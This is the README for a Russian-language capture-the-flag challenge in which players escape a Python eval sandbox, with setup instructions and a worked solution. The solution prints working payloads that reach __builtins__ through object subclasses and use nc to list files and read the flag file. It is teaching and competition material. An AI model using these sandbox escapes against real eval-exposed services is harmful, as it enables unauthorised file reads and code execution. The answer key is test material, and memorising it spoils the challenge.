Python eval
===========
> - Змеи... Вечно они всё портят... Они украли мою прелесть и спрятали здесь: (адрес и порт)... Подлые змеи...  
> - Ходят слухи, что ты говоришь на парселтанге. Помоги забрать прелесть у наглых змей, а я помогу тебе выбраться.  
> - Здесь всё, что я знаю об этом месте: (исходник(eval.py))  
> - May the Dragon Force be with you...  

Файлы
-----
1. **eval.py** - Псевдо исходный код, который доступен участникам
2. **159fe327e79316e0f9169fa326fafbd1.txt** - Файл с флагом
3. **blacklist.txt** - Файл с запрещенными словами
4. **server.py** - Исходный код

Запуск
------
Необходимо создать пользователя с правами только на чтение файла с флагом.  
Файл с сервером, жалетельно, положить отдельно от файла с флагом, и запускать его, из папки с флагом.  
```
python3 server.py [-h] [-host HOST] [-p PORT] [-cpu CPU] [-t TIMEOUT]
```
host - Адрес хоста, по умолчанию - socket.gethostbyname(socket.gethostname())  
port - Порт, по умолчанию 1337  
cpu - Количество одновременно запущенных процессов, по умолчанию 16  
timeout - Время жизни одного процесса, по умолчанию 3 секунды  

Решение
-------
1. Научиться получать доступ к \__builtins__  
    ```
    [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__
    ```
2. Получить список файлов в папке  
    ```
    echo "[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').listdir()" | nc адрес порт
    ```
3. Прочесть флаг  
    ```
    echo "[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['open']('имя файла с флагом').read()" | nc адрес порт
    ```

---

[Описание проблемы](https://habrahabr.ru/post/221937/)  
[Источник](https://www.reddit.com/r/Python/comments/hftnp/ask_rpython_recovering_cleared_globals#thing_t1_c1v372r)  
[Еще полезная ссылочка](http://www.floyd.ch/?p=584)
